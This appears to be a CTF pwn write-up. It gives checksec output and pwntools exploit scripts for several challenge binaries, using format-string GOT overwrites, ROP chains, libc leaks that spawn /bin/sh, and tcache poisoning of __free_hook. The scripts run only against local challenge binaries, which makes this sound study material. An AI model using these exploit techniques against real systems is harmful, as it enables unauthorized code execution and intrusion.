## Pwn

### babbypwn

trivial

### rot26

```
// file
./rot26: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=58df608159f94559b335700b7a8c5df067496f6d, not stripped

// checksec
[*] '/home/u1f383/tmp/pwn/pwn/rot26/bin/rot26'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

fmt, exit_got to magic

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./rot26')
gdb.attach(r, """
b *0x804882c
""")
win = 0x8048737

payload = f"%{0x8737}c%11$hnAAA".encode() + p32(0x804a020)

r.sendline(payload)
r.interactive()
```



### zipline

```
// file 
zipline: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=477e3fba96c095925fe6e4b7983eb40627ea5dbd, not stripped

// checksec
[*] '/home/u1f383/tmp/pwn/pwn/zipline/bin/zipline'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

simple rop

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./zipline')
gdb.attach(r, """
b *0x8049569
""")
buf = 0x0804C040
_read = 0x8049050
magic = 0x8049569

pl = b'A'*0x16 + p32(_read) + p32(magic) + p32(0) + p32(buf) + p32(0x30)

r.sendline(pl)
sleep(0.1)
r.send(b'\xff'*0x10)
r.interactive()
```



### bronze_ropchain

```
// file
./bronze_ropchain: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=16a9964f0e243870ebccdaf50522bcee80741083, not stripped

// checksec
[*] '/home/u1f383/tmp/pwn/pwn/bronze_ropchain/bin/bronze_ropchain'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

find gadget to control esp and ROP

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./bronze_ropchain')
gdb.attach(r, """
b *0x80488e8
""")

pop_eax_edx_ebx_ret = 0x080564b4
pop_ecx_ebx_ret = 0x0806ef52
int_0x80 = 0x0806f860
buf = 0x80dc030

rop = flat(
    pop_eax_edx_ebx_ret, 3, 0x30, 0,
    pop_ecx_ebx_ret, buf, 0,
    int_0x80,

    pop_eax_edx_ebx_ret, 11, 0, buf,
    pop_ecx_ebx_ret, 0, buf,
    int_0x80,
)

gadget = 0x080938de # add esp, 0x48 ; movzx eax, al ; pop ebx ; ret
pl = b'A' * 0x18 + p32(buf) + p32(gadget) + b'B' * 0x1c + rop + b'\n'
r.sendlineafter('What is your name?', pl)
r.send("/bin/sh\x00")

r.interactive()
```



### Stop, ROP,n', Roll

```
// file
./srnr: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=90432bf8c5b636b2f3f5d156ab368fd032bfc92d, not stripped

// checksec
[*] '/home/u1f383/tmp/pwn/pwn/stop-rop-n-roll/bin/srnr'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



可用 `read()` + `__libc_csu_init` 或是 leak libc + `system("/bin/sh")`:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./srnr')
gdb.attach(r, """
b *0x4007b8
""")

stderr = 0x602040
new_rbp = 0x602800

pop_rdi_ret = 0x400823
printf_main = 0x40078b
ret = 0x40059e

r.sendlineafter('[#] number of bytes: ', '0')

pl = b'\xff' * 9 + p64(new_rbp) + p64(pop_rdi_ret) + p64(stderr) + p64(printf_main)
r.send(pl)
libc = u64(r.recv(6).ljust(8, b'\x00'))- 0x1ec5c0
binsh = libc + 0x1b75aa
_system = libc + 0x55410
info(f"""
libc: {hex(libc)}
""")

r.sendline('0')
pl = b'\xff' * 0x11 + p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(_system)
r.send(pl)

r.interactive()
```

### dennis_says

glibc 2.23。



### Knuth

ascii shellcode。



### Black Echo

blind pwn。



### penpal world

```
// file
./penpal_world: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=195416fc8622b4f9906da0915a9abb1dfde40e13, not stripped

// checksec
[*] '/home/u1f383/tmp/pwn/pwn/penpal_world/bin/penpal_world'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

glibc 2.27。



- Use tcache to leak heap
- Use fake largebin chunk to leak libc
- Use tcache poison to write `__free_hook` to `system` and `free("/bin/sh")`

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

"""
1) Create a postcard
2) Edit a postcard
3) Discard a postcard
4) Read a postcard
"""

r = process("./P", env={"LD_PRELOAD": "./libc-2.27.so"}, aslr=False)
gdb.attach(r, """
""")

def add(idx):
    r.sendlineafter('4) Read a postcard\n', '1')
    r.sendlineafter('Which envelope #?\n', str(idx))


def edit(idx, ct):
    r.sendlineafter('4) Read a postcard\n', '2')
    r.sendlineafter('Which envelope #?\n', str(idx))
    assert(len(ct) <= 0x48)
    r.sendafter('Write.\n', ct)

def delete(idx):
    r.sendlineafter('4) Read a postcard\n', '3')
    r.sendlineafter('Which envelope #?\n', str(idx))

def show(idx):
    r.sendlineafter('4) Read a postcard\n', '4')
    r.sendlineafter('Which envelope #?\n', str(idx))

## leak heap ##
add(0)
for i in range(0xe):
    add(1)
edit(1, p64(0) + p64(0x21) + p64(0) * 3 + p64(0x21))
for _ in range(2):
    delete(0)
show(0)
heap = u64(r.recv(6).ljust(8, b'\x00')) - 0x260
info(f"""
heap: {hex(heap)}
""")

## leak libc ##
edit(0, p64(heap + 0x280) + p64(0) * 2 + p64(0x451) + p64(heap + 0x260))
add(1)
add(1)
delete(1)
show(1)
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x3ebca0
_system = libc + 0x4f440
__free_hook = libc + 0x3ed8e8
info(f"""
libc: {hex(libc)}
""")

add(0)
edit(0, p64(0) * 4 + p64(__free_hook - 8))
add(0)
add(0)
edit(0, b"/bin/sh\x00" + p64(_system))
delete(0)

r.interactive()
```
